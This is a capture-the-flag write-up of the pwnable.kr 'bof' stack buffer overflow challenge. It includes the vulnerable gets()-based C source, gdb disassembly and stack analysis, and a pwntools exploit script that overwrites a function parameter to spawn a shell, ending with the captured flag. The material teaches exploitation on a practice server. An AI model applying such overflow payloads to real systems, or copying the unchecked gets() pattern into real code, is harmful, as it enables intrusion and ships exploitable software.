# Pwnable.kr: Toddler's Bottle
## bof

This challenge requires us to perform a simple Buffer Overflow attack for overwriting function parameters stored inside of memory.

The C source code for challenge program is shown below, where the vulnerability is the *gets(overflowme)* call since *char * gets( char * )* has no array boundary checks and just reads *stdin* until the newline character.

*bof.c*
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Using this vulnerability, we can overflow the stack and overwrite the default *0xdeadbeef* parameter to be *0xcafebabe* in order to bypass the *key == 0xcafebabe* check and get a shell. The final piece to the puzzle is figuring out how big our input should be to overflow the key parameter. I used *gdb* to analyse the stack just before the *key == 0xcafebabe* comparison check, by creating a breakpoint at the CMP machine instruction.

```
gdb-peda$ disas func
Dump of assembler code for function func:
   0x0000062c <+0>:	push   ebp
   0x0000062d <+1>:	mov    ebp,esp
   0x0000062f <+3>:	sub    esp,0x48
   0x00000632 <+6>:	mov    eax,gs:0x14
   0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:	xor    eax,eax
   0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
   0x0000064f <+35>:	call   0x650 <func+36>
   **0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe**
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave  
   0x00000689 <+93>:	ret    
End of assembler dump.
gdb-peda$ b * func+40
```

Now we can just run the program inside *gdb* and give it an input of 'AAAAAAAA' until the breakpoint to help identify where the buffer is located on the stack. The character 'A' was randomly chosen, since it has an ascii value of 41 which can help us identify where the buffer is.

```
gdb-peda$ x/50wx $esp
0xffffd1c0:	0xffffd1dc	0xffffd2c4	0xf7fb2000	0xf7fb09e0
0xffffd1d0:	0x00000000	0xf7fb2000	0xf7ffc840	**0x41414141**
0xffffd1e0:	**0x41414141	0xf7fb2000	0x00000001	0x5655549d**
0xffffd1f0:	**0xf7fb23fc	0x00040000	0x56556ff4	0xfb2c4900**
0xffffd200:	**0x00400000	0x56556ff4	0xffffd228	0x5655569f**
0xffffd210:	0xdeadbeef	0x00000000	0x565556b9	0x00000000
0xffffd220:	0xf7fb2000	0xf7fb2000	0x00000000	0xf7df97e1
0xffffd230:	0x00000001	0xffffd2c4	0xffffd2cc	0xffffd254
0xffffd240:	0x00000001	0x00000000	0xf7fb2000	0x00000000
0xffffd250:	0xf7ffd000	0x00000000	0xf7fb2000	0xf7fb2000
0xffffd260:	0x00000000	0x0122c2f7	0x41a9e4e7	0x00000000
0xffffd270:	0x00000000	0x00000000	0x00000001	0x56555530
0xffffd280:	0x00000000	0xf7fe9450
```

The buffer starts at the top *0x41414141* entry in the stack, which is located at 4*13=52 bytes above the *0xdeadbeef* parameter. Therefore our input needs to have 52 bytes before we overflow the parameter. However, since our target system has little-endian ordering we will have to reverse our overflowing value.

We can now write our *pwn* script so that we overflow the buffer by 52 bytes then overwrite the passed parameter to the *func* call.

*bof_pwn.py*
```
from pwn import *

payload = 52*'A' + '\xbe\xba\xfe\xca'
shell = remote('pwnable.kr',9000)
shell.send(payload)
shell.interactive()
'''

Hooray! We have just got our flag!

'''
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$
$ cat flag
daddy, I just pwned a buFFer :)
```
